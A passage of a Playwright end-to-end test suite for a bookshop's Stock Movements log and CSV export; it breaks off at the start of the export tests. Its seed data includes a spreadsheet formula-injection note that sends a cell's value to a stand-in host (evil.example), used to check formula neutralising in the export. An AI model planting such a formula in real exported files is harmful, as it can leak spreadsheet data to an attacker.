/**
 * PR 558 / ClickUp 86exmwjgc "View Stock Movements Log" and 86extv6wg "Export Stock Movements to CSV".
 *  Log:    sidebar/tab entry, (breadcrumb waived 2026-11-16), Item Detail "View all" deep link, Last 30 days default (inclusive), reason
 *          multi-select, item search (name, SKU, variant SKU), KPI strip follows every filter, Date desc default,
 *          sortable Date/Item/Reason/Quantity/User, Notes tooltip, Item link, empty/invalid-range/network/denied copy.
 *  Export: the current filters + sort, file name, column order and labels, YYYY-MM-DD + ISO 8601, empty toast,
 *          over-10,000 confirm (Cancel/Continue), failure toast + re-enabled button, one audit row per export,
 *          Export permission, formula neutralising.
 * Plus: other tenants, API validation (no 500s), immutability, Pixel 5.
 *
 * Data (self-seeded once per run, cached in the project output dir):
 *   campus A (owner): Oxford English Book 5 (single), School Tie (Small/Large variants), Notebook A4 (single), 13 movements
 *     in the last 30 days, 2 just outside it, 10,001 bulk rows 100 days ago and 50,001 rows 200 days ago (DB SETUP);
 *   campus B: its own item, for the tenant checks;
 *   campus C: role stand-ins (DB SETUP: tenant owner moved off the user, AccessRoleAssignments row) for permissions.
 * The browser runs in UTC so "today" is the server's movement date (the seed's dates are UTC calendar dates).
 */
import { test, expect, devices, type Browser, type BrowserContext, type Page } from '@playwright/test';
import { mkdir, readFile, writeFile, access } from 'node:fs/promises';
import path from 'node:path';
import { newCampusOwner, type CampusOwner } from '../../fixtures/campus-owner';
import { signInToWebApp } from '../../pages/fees/AccountOffice';
import * as f from '../../fixtures/fees';
import * as b from '../../fixtures/bookshop';

const EV = process.env.QA_EVIDENCE_DIR ?? path.join(__dirname, '..', '..', 'test-results', 'evidence');
const ignoreHTTPSErrors = (process.env.QA_IGNORE_HTTPS_ERRORS ?? 'false').toLowerCase() === 'true';
const LOG = '/bookshop/stock-movements';
const HEADER = ['Date', 'Item', 'Variant', 'SKU', 'Reason', 'Quantity', 'Before', 'After', 'Notes', 'Created At'];
const FORMULA_NOTE = '=HYPERLINK("https://evil.example/?"&A1,"click")';
const QUOTED_NOTE = 'Sold, "bulk" order\nsecond line';
const LONG_NOTE = 'Vendor ABC Books delivered the term order late; invoice to follow from the head office next week';
const COPY = {
  empty: 'No stock movements match your filters.',
  order: 'End date must be on or after the start date.',
  network: 'We could not load the stock movements. Please check your connection and try again.',
  denied: 'You do not have permission to view Stock Movements.',
  preparing: 'Preparing your file...',
  ready: 'Export ready.',
  nothing: 'Nothing to export.',
  nothingMsg: 'Adjust your filters and try again.',
  large: (n: string) => `You are about to export ${n} rows. This may take a minute.`,
  failed: 'We could not prepare your file. Please try again.',
};

test.describe.configure({ mode: 'default' });
test.use({ timezoneId: 'UTC' });

interface Seed {
  book: b.Item; tie: b.Item; notebook: b.Item; bulk: b.Item;
  b: { tenantId: string; item: b.Item };
  c: { tenantId: string; item: b.Item; viewerRoleId: string };
}
let A: CampusOwner; let B: CampusOwner; let C: CampusOwner;
let seed: Seed;

const ymd = (d: string) => d.replace(/-/g, '');
const fileName = (from: string, to: string) => `stock-movements-${ymd(from)}-${ymd(to)}.csv`;
const shot = async (page: Page, name: string, fullPage = true) => {
  await mkdir(EV, { recursive: true });
  await page.screenshot({ path: path.join(EV, `sm558-${name}.png`), fullPage });
};

async function seedAll(outputDir: string) {
  const file = path.join(outputDir, '.stock-movements-558.json');
  try {
    const cached = JSON.parse(await readFile(file, 'utf8'));
    return { A: await (await import('../../fixtures/campus-owner')).ownerFromCache(cached.A), B: await (await import('../../fixtures/campus-owner')).ownerFromCache(cached.B), C: await (await import('../../fixtures/campus-owner')).ownerFromCache(cached.C), seed: cached.seed as Seed };
  } catch { /* first run */ }
  const { cacheOwner } = await import('../../fixtures/campus-owner');
  const a = await newCampusOwner('sm558a');
  const book = await b.createItem(a, { name: 'Oxford English Book 5' });
  const tie = await b.createVariantItem(a, { name: 'School Tie', sizes: ['Small', 'Large'] });
  const notebook = await b.createItem(a, { name: 'Notebook A4', openingStock: 200 });
  const [small, large] = tie.variants.sort((x, y) => (x.name === 'Small' ? -1 : 1));
  await b.movement(a, book.id, { reason: 'Purchase Receipt', quantity: 50, date: b.utcDate(3), notes: LONG_NOTE, reference: 'INV-2026-0042' });
  await b.movement(a, book.id, { reason: 'Damage', quantity: 2, date: b.utcDate(2), notes: FORMULA_NOTE });
  await b.movement(a, tie.id, { reason: 'Sale', quantity: 3, date: b.utcDate(1), variantId: small.id, notes: '+92 counter sale' });
  await b.movement(a, notebook.id, { reason: 'Sale', quantity: 5, date: b.utcDate(5), notes: QUOTED_NOTE });
  await b.movement(a, notebook.id, { reason: 'Loss', quantity: 1, date: b.utcDate(10), notes: '@SUM(1,2) crate missing' });
  await b.movement(a, book.id, { reason: 'Return to Supplier', quantity: 3, date: b.utcDate(15), notes: '-3 misprinted copies' });
  await b.movement(a, book.id, { reason: 'Stock Correction', quantity: -4, date: b.utcDate(29), notes: 'Count on the first day of the range' });
  await b.movement(a, notebook.id, { reason: 'Purchase Receipt', quantity: 10, date: b.utcDate(30), notes: 'One day before the range' });
  await b.movement(a, tie.id, { reason: 'Return from Student', quantity: 1, date: b.utcDate(40), variantId: large.id });
  await b.cashSale(a, book.id, 1);
  // Bulk rows for the large-export cases: one item, 10,001 rows 100 days ago and 50,001 rows 200 days ago.
  const bulk = await b.createItem(a, { name: 'Bulk Pencil', openingStock: 1 });
  for (const [n, days] of [[10_001, 100], [50_001, 200]] as const) {
    await f.dbSetup(`PR 558 large export: ${n} movements ${days} days ago on Bulk Pencil (tenant ${a.tenantId})`, `
      insert into "BookshopStockMovements" ("Id","TenantId","BookshopItemId","Quantity","Reason","MovementDate","CreatedDate","CreatedBy","BeforeQuantity","AfterQuantity","CreatedByName")
      select gen_random_uuid(), ${f.sqlQuote(a.tenantId)}, ${f.sqlQuote(bulk.id)}, 1, 'Purchase Receipt', (current_date - ${days})::timestamp at time zone 'UTC', now(), ${f.sqlQuote(a.userId)}, g, g + 1, 'QA Bulk'
      from generate_series(1, ${n}) g`);
  }
  const bo = await newCampusOwner('sm558b');
  const bItem = await b.createItem(bo, { name: 'Other School Atlas' });
  const co = await newCampusOwner('sm558c');
  const cItem = await b.createItem(co, { name: 'Permission Ruler' });
  const role = await f.ok(await co.api.post('access-roles', {
    data: {
      sourceSystemRole: 'Bookshop Admin', roleName: `Stock Viewer ${f.letters(4)}`, description: 'See + Edit on Bookshop, no Export',
      permissions: [{ moduleKey: 'bookshop', see: true, edit: true, approve: false, export: false, publish: false }],
    },
  }), 'custom role without Export');
  const s: Seed = { book, tie, notebook, bulk, b: { tenantId: bo.tenantId, item: bItem }, c: { tenantId: co.tenantId, item: cItem, viewerRoleId: role.id } };
  await mkdir(outputDir, { recursive: true });
  await writeFile(file, JSON.stringify({ A: cacheOwner(a), B: cacheOwner(bo), C: cacheOwner(co), seed: s }), { mode: 0o600 });
  return { A: a, B: bo, C: co, seed: s };
}

/** A signed-in WebApp context for an owner (storage state cached per owner per run). */
async function ownerContext(browser: Browser, owner: CampusOwner, opts: Parameters<Browser['newContext']>[0] = {}, fresh = false): Promise<BrowserContext> {
  const state = path.join(test.info().project.outputDir, `.state-${owner.tenantId}.json`);
  const base = { baseURL: process.env.QA_BASE_URL, ignoreHTTPSErrors, timezoneId: 'UTC', acceptDownloads: true, ...opts };
  if (!fresh) {
    try {
      await access(state);
      return await browser.newContext({ ...base, storageState: state });
    } catch { /* sign in below */ }
  }
  const ctx = await browser.newContext({ ...base, storageState: { cookies: [], origins: [] } });
  const page = await ctx.newPage();
  await signInToWebApp(page, owner.credentials());
  if (!fresh) await ctx.storageState({ path: state });
  await page.close();
  return ctx;
}

async function openLog(ctx: BrowserContext, url = LOG): Promise<Page> {
  const page = await ctx.newPage();
  await page.goto(url);
  await expect(page.getByRole('heading', { name: 'Stock Movements', level: 1 })).toBeVisible({ timeout: 60_000 });
  return page;
}

const table = (page: Page) => page.locator(`#bookshop-stock-movements-table`);
const bodyRows = (page: Page) => table(page).locator('tbody tr');
async function rowTexts(page: Page): Promise<string[]> {
  return (await bodyRows(page).allInnerTexts()).map((t) => t.replace(/\s+/g, ' ').trim());
}
/** n rendered rows with content (the table draws empty skeleton rows while a page loads). */
async function expectRowCount(page: Page, n: number) {
  await expect.poll(async () => {
    const texts = await rowTexts(page);
    return texts.length === n && texts.every((t) => t.length > 0) ? n : `${texts.length} rows, ${texts.filter((t) => !t).length} empty`;
  }, { timeout: 20_000 }).toBe(n);
}
const tile = (page: Page, key: 'movements' | 'stock-in' | 'stock-out' | 'adjustments') => page.locator(`[data-tile="${key}"]`);
async function expectTiles(page: Page, t: [number, number, number, number]) {
  const keys = ['movements', 'stock-in', 'stock-out', 'adjustments'] as const;
  for (let i = 0; i < 4; i++) await expect(tile(page, keys[i]).locator('dd').first(), `${keys[i]} tile`).toHaveText(t[i].toLocaleString('en-US'), { timeout: 20_000 });
}
async function openFilters(page: Page) {
  await page.getByRole('button', { name: 'Open filters' }).click();
  await expect(page.getByRole('dialog', { name: 'Filters' })).toBeVisible();
}
async function tickReasons(page: Page, reasons: string[], on = true) {
  await openFilters(page);
  const dialog = page.getByRole('dialog', { name: 'Filters' });
  for (const r of reasons) await dialog.getByRole('checkbox', { name: r, exact: true }).setChecked(on);
  // The library's filter popover applies on its Apply button when it has one; otherwise each tick applies.
  const apply = dialog.getByRole('button', { name: /^Apply/ });
  if (await apply.count()) await apply.click();
  else await page.keyboard.press('Escape');
}
async function search(page: Page, term: string) {
  const box = page.getByRole('textbox', { name: 'Search by item name or SKU' });
  const res = page.waitForResponse((r) => r.url().includes('/stock-movements/paged') && r.url().includes('search='), { timeout: 20_000 }).catch(() => null);
  await box.fill(term);
  await res;
}
async function customRange(page: Page, from: string, to: string) {
  await page.getByRole('combobox', { name: 'Date range' }).selectOption({ label: 'Custom' });
  await page.getByRole('combobox', { name: 'From' }).fill(from);
  await page.getByRole('combobox', { name: 'From' }).press('Enter');
  await page.getByRole('combobox', { name: 'To' }).fill(to);
  await page.getByRole('combobox', { name: 'To' }).press('Enter');
  await page.getByRole('combobox', { name: 'To' }).blur();
}
const exportButton = (page: Page) => page.locator('[data-action="export-movements"]');
async function exportCsv(page: Page): Promise<{ name: string; rows: string[][]; raw: string }> {
  const dl = page.waitForEvent('download', { timeout: 60_000 });
  await exportButton(page).click();
  const d = await dl;
  const p = await d.path();
  const raw = await readFile(p!, 'utf8');
  return { name: d.suggestedFilename(), rows: b.parseCsv(raw.replace(/^\uFEFF/, '')).filter((r) => r.length > 1 || r[0] !== ''), raw };
}
async function api(owner: CampusOwner, url: string) {
  const r = await owner.api.get(url.replace(/^\//, ''));
  return { status: r.status(), text: await r.text(), headers: r.headers() };
}
async function pagedAll(owner: CampusOwner, query: string): Promise<any[]> {
  const out: any[] = [];
  for (let page = 1; page < 50; page++) {
    const r = await f.ok(await owner.api.get(`bookshop/stock-movements/paged?page=${page}&pageSize=100&${query}`), `paged ${query}`);
    out.push(...r.items);
    if (out.length >= r.totalCount || r.items.length === 0) break;
  }
  return out;
}
const last30 = () => `dateFrom=${b.utcDate(29)}&dateTo=${b.utcDate(0)}`;

test.beforeAll(async ({}, testInfo) => {
  test.setTimeout(10 * 60_000);
  const s = await seedAll(testInfo.project.outputDir);
  A = s.A; B = s.B; C = s.C; seed = s.seed;
});

// ── 86exmwjgc: View Stock Movements Log ─────────────────────────────────────────────────────────

test.describe('Stock Movements log (86exmwjgc)', () => {
  test('opens from the Bookshop navigation with the Last 30 days default (inclusive), the KPI strip, 10 rows a page and Date descending @smoke', async ({ browser }) => {
    const ctx = await ownerContext(browser, A);
    const page = await ctx.newPage();
    await page.goto('/bookshop/inventory');
    await page.getByRole('navigation', { name: 'Modules' }).getByRole('link', { name: 'Bookshop' }).first().waitFor({ timeout: 60_000 });
    await page.getByRole('navigation', { name: 'Bookshop pages' }).getByRole('link', { name: 'Stock Movements' }).click();
    await expect(page).toHaveURL(/\/bookshop\/stock-movements$/);
    await expect(page.getByRole('heading', { name: 'Stock Movements', level: 1 })).toBeVisible({ timeout: 60_000 });
    await expect(page.getByRole('combobox', { name: 'Date range' })).toHaveValue(/.+/);
    await expect(page.getByRole('combobox', { name: 'Date range' }).locator('option:checked')).toHaveText('Last 30 days');
    await expectTiles(page, [13, 6, 5, 2]);
    await expectRowCount(page, 10);
    const headers = (await table(page).locator('thead th').allInnerTexts()).map((h) => h.trim()).filter(Boolean);
    expect(headers).toEqual(['Date', 'Item', 'Reason', 'Quantity', 'Before', 'After', 'User', 'Notes']);
    const page1 = await rowTexts(page);
    expect(page1[0].startsWith(new Date().toUTCString().slice(5, 16)), page1[0]).toBe(true);
    await shot(page, 'log-default');
    await page.getByRole('button', { name: /Next/ }).click();
    await expectRowCount(page, 3);
    const page2 = await rowTexts(page);
    // The range's first day (today - 29) is in; the day before it is not.
    expect(page2.join('\n')).toContain('Stock Correction');
    expect([...page1, ...page2].join('\n')).not.toContain('One day before the range');
    const dates = [...page1, ...page2].map((t) => Date.parse(t.slice(0, 11) + ' UTC'));
    expect([...dates].sort((x, y) => y - x), 'Date descending').toEqual(dates);
    await ctx.close();
  });

  // Waived by Umair on 2026-11-16 (PR 558 cycle 1, finding H2): the F7 shell removed breadcrumbs app-wide, so the
  // "Bookshop / Stock Movements" breadcrumb criterion no longer applies. Kept skipped for reference.
  test.skip('breadcrumb reads "Bookshop / Stock Movements" (waived 2026-11-16)', async ({ browser }) => {
    const ctx = await ownerContext(browser, A);
    const page = await openLog(ctx);
    await expectRowCount(page, 10);
    await shot(page, 'breadcrumb', false);
    const crumbs = page.getByRole('navigation', { name: /breadcrumb/i });
    await expect(crumbs, 'a breadcrumb navigation on the page').toBeVisible({ timeout: 5_000 });
    await expect(crumbs).toHaveText(/Bookshop\s*\/\s*Stock Movements/);
    await ctx.close();
  });

  // z94x8ednd0 (cycle 1 H1, high): the headers were not buttons. Cycle 2: each header is a button, sets aria-sort, asks the server
  // for sortBy=<key> (asc, then desc on a second click), and the rows on screen - page 1 and page 2 - are the server's order for that
  // sort (so the sort covers the whole result, not only the rows of one page). Before, After and Notes stay plain.
  test('Date, Item, Reason, Quantity and User headers sort the table both ways across pages; Before, After and Notes do not @smoke', async ({ browser }) => {
    const ctx = await ownerContext(browser, A);
    const page = await openLog(ctx);
    await expectRowCount(page, 10);
    const sent: URLSearchParams[] = [];
    page.on('request', (r) => { if (r.url().includes('/stock-movements/paged')) sent.push(new URL(r.url()).searchParams); });
    const failures: string[] = [];
    const key = (r: any) => `${r.itemName} ${r.reason}`;
    const matches = (ui: string[], api: any[]) => ui.length === api.length && ui.every((t, i) => t.includes(api[i].itemName) && t.includes(api[i].reason));
    for (const [header, sortKey] of [['Quantity', 'quantity'], ['Item', 'item'], ['Reason', 'reason'], ['User', 'user'], ['Date', 'date']] as const) {
      const th = table(page).getByRole('columnheader', { name: header });
      for (const click of [1, 2]) {
        const before = sent.length;
        const btn = th.getByRole('button');
        if ((await btn.count()) === 0) { failures.push(`${header}: no header button`); break; }
        await btn.first().click();
        await expect.poll(() => sent.slice(before).some((q) => q.get('sortBy') === sortKey), { timeout: 10_000 }).toBe(true).catch(() => {});
        const q = sent.slice(before).filter((x) => x.get('sortBy') === sortKey).pop();
        if (!q) { failures.push(`${header} click ${click}: no request with sortBy=${sortKey} (sent ${JSON.stringify(sent.slice(before).map((x) => x.toString()))})`); continue; }
        const dir = q.get('sortDir') ?? 'asc';
        await expectRowCount(page, 10);
        await page.waitForTimeout(500);
        const aria = await th.getAttribute('aria-sort');
        const want = dir === 'desc' ? 'descending' : 'ascending';
        if (aria !== want) failures.push(`${header} click ${click}: sortDir=${dir} but aria-sort=${aria}`);
        const api = await pagedAll(A, `${last30()}&sortBy=${sortKey}&sortDir=${dir}`);
        const ui1 = await rowTexts(page);
        if (!matches(ui1, api.slice(0, 10))) failures.push(`${header} ${dir} page 1: ui=${JSON.stringify(ui1.map((t) => t.slice(0, 60)))} api=${JSON.stringify(api.slice(0, 10).map(key))}`);
        if (click === 2) {
          await page.getByRole('button', { name: /Next/ }).click();
          await expectRowCount(page, 3);
          const ui2 = await rowTexts(page);
          if (!matches(ui2, api.slice(10))) failures.push(`${header} ${dir} page 2: ui=${JSON.stringify(ui2.map((t) => t.slice(0, 60)))} api=${JSON.stringify(api.slice(10).map(key))}`);
          await page.getByRole('button', { name: /Previous|Prev/ }).first().click();
          await expectRowCount(page, 10);
        }
        if (click === 1) console.log(`${header}: first click sortDir=${dir}, aria-sort=${aria}`);
        if (header === 'Date' && click === 1) await shot(page, 'sort-date-first-click', false);
      }
      if (header === 'Quantity') await shot(page, 'sort-quantity', false);
    }
    const dirs = sent.map((q) => `${q.get('sortBy')}:${q.get('sortDir')}`);
    console.log(`requests: ${dirs.join(' ')}`);
    for (const plain of ['Before', 'After', 'Notes']) {
      const th = table(page).getByRole('columnheader', { name: plain });
      if ((await th.getByRole('button').count()) > 0) failures.push(`${plain}: should not be sortable`);
    }
    await shot(page, 'sort-headers', false);
    expect(failures, 'sortable headers').toEqual([]);
    await ctx.close();
  });

  test('Export after a header sort downloads the rows in the sorted order (Quantity ascending, then Item descending)', async ({ browser }) => {
    const ctx = await ownerContext(browser, A);
    const page = await openLog(ctx);
    await expectRowCount(page, 10);
    const sent: URLSearchParams[] = [];
    page.on('request', (r) => { if (r.url().includes('/stock-movements/')) sent.push(new URL(r.url()).searchParams); });
    for (const [header, clicks] of [['Quantity', 1], ['Item', 2]] as const) {
      for (let i = 0; i < clicks; i++) { await table(page).getByRole('columnheader', { name: header }).getByRole('button').click(); await page.waitForTimeout(1200); }
      await expectRowCount(page, 10);
      const q = sent.filter((x) => x.get('sortBy')).pop()!;
      const csv = await exportCsv(page);
      const api = await pagedAll(A, `${last30()}&sortBy=${q.get('sortBy')}&sortDir=${q.get('sortDir')}`);
      console.log(`${header}: export after sortBy=${q.get('sortBy')}&sortDir=${q.get('sortDir')}: ${csv.rows.length - 1} rows`);
      expect(csv.rows.slice(1).map((r) => `${r[1]}|${r[4]}|${r[5]}`), `${header} export order`).toEqual(api.map((s) => `${s.itemName}|${s.reason}|${s.quantity}`));
    }
    await ctx.close();
  });

  test('the server sorts each sortable key both ways (the API the headers would call)', async () => {
    const q = last30();
    const quantity = (await pagedAll(A, `${q}&sortBy=quantity&sortDir=asc`)).map((r) => r.quantity);
    expect(quantity).toEqual([...quantity].sort((x, y) => x - y));
    const items = (await pagedAll(A, `${q}&sortBy=item&sortDir=desc`)).map((r) => r.itemName.toLowerCase());
    expect(items).toEqual([...items].sort().reverse());
    const reasons = (await pagedAll(A, `${q}&sortBy=reason&sortDir=asc`)).map((r) => r.reason);
    expect(reasons).toEqual([...reasons].sort((x, y) => (x < y ? -1 : x > y ? 1 : 0)));
    const users = await pagedAll(A, `${q}&sortBy=user&sortDir=asc`);
    expect(users.every((r) => r.user && r.user !== 'Unknown user'), 'every row names its user').toBe(true);
  });

  // z94x8ednd1 (cycle 1 N1): same-day rows flipped between a first visit (sortBy=date desc) and a return visit (no sortBy), and the CSV followed.
  test('same-day movements keep one order: a first visit (sortBy=date desc) and a return visit list and export them the same way, newest first @smoke', async ({ browser }) => {
    const explicit = (await f.ok(await A.api.get(`bookshop/stock-movements/paged?page=1&pageSize=10&${last30()}&sortBy=date&sortDir=desc`), 'explicit')).items;
    const implicit = (await f.ok(await A.api.get(`bookshop/stock-movements/paged?page=1&pageSize=10&${last30()}`), 'implicit')).items;
    const todayExplicit = explicit.filter((r: any) => r.movementDate.startsWith(b.utcDate(0))).map((r: any) => `${r.reason} ${r.itemName}/${r.variantName ?? ''}`);
    const todayImplicit = implicit.filter((r: any) => r.movementDate.startsWith(b.utcDate(0))).map((r: any) => `${r.reason} ${r.itemName}/${r.variantName ?? ''}`);
    console.log(`today, sortBy=date&sortDir=desc (first visit): ${todayExplicit.join(' | ')}\ntoday, no sortBy (return visit): ${todayImplicit.join(' | ')}`);
    // UI evidence: a fresh session sends sortBy=date&sortDir=desc, a return visit restores the table without it.
    const ctx = await ownerContext(browser, A, {}, true);
    const urls: string[] = [];
    ctx.on('request', (r) => { if (r.url().includes('/stock-movements/paged')) urls.push(r.url()); });
    const page = await openLog(ctx);
    await expectRowCount(page, 10);
    const first = (await rowTexts(page)).slice(0, 4);
    const csvFirst = await exportCsv(page);
    await page.goto('/bookshop/inventory');
    await page.waitForTimeout(2000);
    await page.goto(LOG);
    await expectRowCount(page, 10);
    await page.waitForTimeout(1000);
    const again = (await rowTexts(page)).slice(0, 4);
    const csvAgain = await exportCsv(page);
    console.log(`UI requests:\n${urls.join('\n')}\nfirst visit top rows:\n${first.join('\n')}\nreturn visit top rows:\n${again.join('\n')}`);
    await shot(page, 'same-day-order-return-visit', false);
    await ctx.close();
    expect(todayExplicit, 'same-day order with sortBy=date desc equals the default order (most recent first)').toEqual(todayImplicit);
    expect(again, 'the top rows on a return visit equal the first visit').toEqual(first);
    expect(csvAgain.raw, 'two exports of the same view are identical').toBe(csvFirst.raw);
    // Newest first inside the day: Created At (column 10) never increases down today's rows.
    const created = csvFirst.rows.slice(1).filter((r) => r[0] === b.utcDate(0)).map((r) => Date.parse(r[9]));
    expect(created.length, 'several movements today').toBeGreaterThan(1);
    expect(created, 'same-day rows newest first').toEqual([...created].sort((x, y) => y - x));
    // Date ascending: oldest first inside the day (Created At never decreases). Rows recorded in the same microsecond (a variant
    // item's opening stock rows) keep the Id tie-break in both directions, which is fine.
    const ascCsv = await A.api.get(`bookshop/stock-movements/export?${last30()}&sortBy=date&sortDir=asc`);
    const ascCreated = b.parseCsv(await ascCsv.text()).filter((r) => r.length > 1).slice(1).filter((r) => r[0] === b.utcDate(0)).map((r) => Date.parse(r[9]));
    expect(ascCreated, 'Date ascending lists the same day oldest first').toEqual([...ascCreated].sort((x, y) => x - y));
  });

  test('Reason multi-select filters to the ticked codes, the KPI strip follows, and unticking all clears the filter @smoke', async ({ browser }) => {
    const ctx = await ownerContext(browser, A);
    const page = await openLog(ctx);
    await expectTiles(page, [13, 6, 5, 2]);
    await tickReasons(page, ['Sale', 'Damage']);
    await expectRowCount(page, 4);
    for (const t of await rowTexts(page)) expect(t).toMatch(/ (Sale|Damage) /);
    await expectTiles(page, [4, 0, 3, 1]);
    await shot(page, 'filter-sale-damage');
    await tickReasons(page, ['Sale', 'Damage'], false);
    await expectRowCount(page, 10);
    await expectTiles(page, [13, 6, 5, 2]);
    await ctx.close();
  });

  test('Item search matches the item name, its SKU and a variant SKU (variants included); the KPI strip follows', async ({ browser }) => {
    const ctx = await ownerContext(browser, A);
    const page = await openLog(ctx);
    await expectRowCount(page, 10);
    await search(page, 'school tie');
    await expectRowCount(page, 3); // two opening balances + the Small sale
    for (const t of await rowTexts(page)) expect(t).toContain('School Tie');
    await expectTiles(page, [3, 2, 1, 0]);
    await search(page, seed.notebook.sku.toLowerCase());
    await expectRowCount(page, 3); // opening, sale, loss
    for (const t of await rowTexts(page)) expect(t).toContain('Notebook A4');
    await expectTiles(page, [3, 1, 2, 0]);
    const small = seed.tie.variants.find((v) => v.name === 'Small')!;
    await search(page, small.sku);
    await expectRowCount(page, 2); // Small opening + Small sale
    for (const t of await rowTexts(page)) expect(t).toContain('Small');
    await expectTiles(page, [2, 1, 1, 0]);
    await shot(page, 'search-variant-sku');
    await ctx.close();
  });

  test('a custom range filters by Movement Date inclusive; This month and Last month send their month', async ({ browser }) => {
    const ctx = await ownerContext(browser, A);
    const page = await openLog(ctx);
    await expectRowCount(page, 10);
    await customRange(page, b.utcDate(3), b.utcDate(3));
    await expectRowCount(page, 1);
    expect((await rowTexts(page))[0]).toContain('Purchase Receipt');
    await expectTiles(page, [1, 1, 0, 0]);
    await customRange(page, b.utcDate(40), b.utcDate(30));
    await expectRowCount(page, 2);
    await expectTiles(page, [2, 2, 0, 0]);
    const now = new Date();
    const first = new Date(Date.UTC(now.getUTCFullYear(), now.getUTCMonth(), 1)).toISOString().slice(0, 10);
    const req = page.waitForRequest((r) => r.url().includes('/stock-movements/paged') && r.url().includes(`dateFrom=${first}`));
    await page.getByRole('combobox', { name: 'Date range' }).selectOption({ label: 'This month' });
    await req;
    const prev = new Date(Date.UTC(now.getUTCFullYear(), now.getUTCMonth() - 1, 1)).toISOString().slice(0, 10);
    const prevEnd = new Date(Date.UTC(now.getUTCFullYear(), now.getUTCMonth(), 0)).toISOString().slice(0, 10);
    const req2 = page.waitForRequest((r) => r.url().includes('/stock-movements/paged') && r.url().includes(`dateFrom=${prev}`) && r.url().includes(`dateTo=${prevEnd}`));
    await page.getByRole('combobox', { name: 'Date range' }).selectOption({ label: 'Last month' });
    await req2;
    await ctx.close();
  });

  test('an end date before the start date shows the exact picker message and does not reload the list', async ({ browser }) => {
    const ctx = await ownerContext(browser, A);
    const page = await openLog(ctx);
    await expectRowCount(page, 10);
    const reqs: string[] = [];
    page.on('request', (r) => { if (r.url().includes('/stock-movements/paged')) reqs.push(r.url()); });
    await customRange(page, b.utcDate(2), b.utcDate(5));
    await expect(page.getByText(COPY.order, { exact: true })).toBeVisible();
    await page.waitForTimeout(1000);
    expect(reqs, 'no list request for an invalid range').toEqual([]);
    await expectRowCount(page, 10);
    await shot(page, 'invalid-range', false);
    await ctx.close();
  });

  test('no movements in the filtered range: the exact empty copy and 0 on every KPI tile, with no link', async ({ browser }) => {
    const ctx = await ownerContext(browser, A);
    const page = await openLog(ctx);
    await expectRowCount(page, 10);
    await customRange(page, b.utcDate(60), b.utcDate(50));
    await expect(page.getByText(COPY.empty, { exact: true })).toBeVisible({ timeout: 20_000 });
    await expectTiles(page, [0, 0, 0, 0]);
    expect(await page.locator('[data-movements-tiles] a').count(), 'KPI tiles carry no link').toBe(0);
    await shot(page, 'empty-range');
    await ctx.close();
  });

  // z94x8ednd2 (cycle 1 L1, Umair 2026-11-16): the button reads "Retry" and the sentence appears once (no repeated second line).
  test('a network failure shows the exact copy once with a Retry button, and retrying recovers the table @smoke', async ({ browser }) => {
    const ctx = await ownerContext(browser, A);
    const page = await ctx.newPage();
    await page.route('**/bookshop/stock-movements/paged**', (r) => r.abort('internetdisconnected'));
    await page.goto(LOG);
    await expect(page.getByText(COPY.network, { exact: true })).toBeVisible({ timeout: 60_000 });
    const retry = page.getByRole('button', { name: /^(Retry|Try again)$/ });
    await expect(retry).toBeVisible();
    const label = (await retry.innerText()).trim();
    const alert = page.locator('[data-load-error]');
    const alertText = (await alert.innerText()).replace(/\s+/g, ' ');
    const repeats = (alertText.match(/check your connection/gi) ?? []).length;
    const toasts = await page.getByText('A network error occurred', { exact: false }).count();
    console.log(`alert text: ${alertText} | button: ${label} | generic network toasts: ${toasts}`);
    await shot(page, 'network-failure', false);
    await page.unroute('**/bookshop/stock-movements/paged**');
    await retry.click();
    await expectRowCount(page, 10);
    await expectTiles(page, [13, 6, 5, 2]);
    // Confirmed by Umair on 2026-11-16: the button must read "Retry" as in the story (finding L1, filed as a normal bug).
    expect(label, 'the story names the button "Retry"').toBe('Retry');
    expect(repeats, 'the sentence appears once in the alert').toBe(1);
    await ctx.close();
  });

  test('Notes truncate to one line with the full text on hover, and the Item name links to Item Detail', async ({ browser }) => {
    const ctx = await ownerContext(browser, A);
    const page = await openLog(ctx);
    await expectRowCount(page, 10);
    const note = table(page).locator('[data-notes]').filter({ hasText: 'Vendor ABC Books' });
    await expect(note).toHaveAttribute('title', LONG_NOTE);
    const [clientW, scrollW] = await note.evaluate((el) => [el.clientWidth, el.scrollWidth]);
    expect(scrollW, 'the cell is truncated').toBeGreaterThan(clientW);
    await expect(note).toHaveCSS('text-overflow', 'ellipsis');
    await note.hover();
    await shot(page, 'notes-tooltip', false);
    await table(page).getByRole('link', { name: 'Notebook A4' }).first().click();
    await expect(page).toHaveURL(new RegExp(`/bookshop/inventory/${seed.notebook.id}$`));
    await ctx.close();
  });

  test('Item Detail "View all" opens the log pre-filtered to that item and its variants with the default range; Show all items clears it', async ({ browser }) => {
    const ctx = await ownerContext(browser, A);
    const page = await ctx.newPage();
    await page.goto(`/bookshop/inventory/${seed.tie.id}`);
    await page.locator('[data-action="view-all-movements"]').click({ timeout: 60_000 });
    await expect(page).toHaveURL(new RegExp(`/bookshop/stock-movements\\?item=${seed.tie.id}$`));
    await expect(page.locator('[data-scope-badge]')).toContainText('School Tie', { timeout: 30_000 });
    await expectRowCount(page, 3); // the Large return 40 days ago is outside the default range
    for (const t of await rowTexts(page)) expect(t).toContain('School Tie');
    await expectTiles(page, [3, 2, 1, 0]);
    await expect(page.getByRole('combobox', { name: 'Date range' }).locator('option:checked')).toHaveText('Last 30 days');
    await shot(page, 'deep-link');
    await page.locator('[data-action="clear-scope"]').click();
    await expect(page).toHaveURL(/\/bookshop\/stock-movements$/);
    await expectRowCount(page, 10);
    await expectTiles(page, [13, 6, 5, 2]);
    await ctx.close();
  });

  test('the log is immutable: no row actions, and the API has no edit or delete for a movement', async ({ browser }) => {
    const ctx = await ownerContext(browser, A);
    const page = await openLog(ctx);
    await expectRowCount(page, 10);
    expect(await table(page).locator('tbody button, tbody [role="menu"], tbody input[type="checkbox"]').count()).toBe(0);
    const row = (await pagedAll(A, last30()))[0];
    for (const method of ['put', 'delete', 'patch'] as const) {
      const r = await A.api[method](`bookshop/stock-movements/${row.id}`, method === 'delete' ? undefined : { data: { quantity: 1 } });
      expect([404, 405], `${method.toUpperCase()} /bookshop/stock-movements/{id}`).toContain(r.status());
    }
    await ctx.close();
  });
});

// ── 86extv6wg: Export Stock Movements to CSV ────────────────────────────────────────────────────

test.describe('Stock Movements export (86extv6wg)', () => {
  test('exports the default Last 30 days view: every row across pages, the file name, columns, dates and an audit row @smoke', async ({ browser }) => {
    const ctx = await ownerContext(browser, A);
    const pagedUrls: string[] = [];
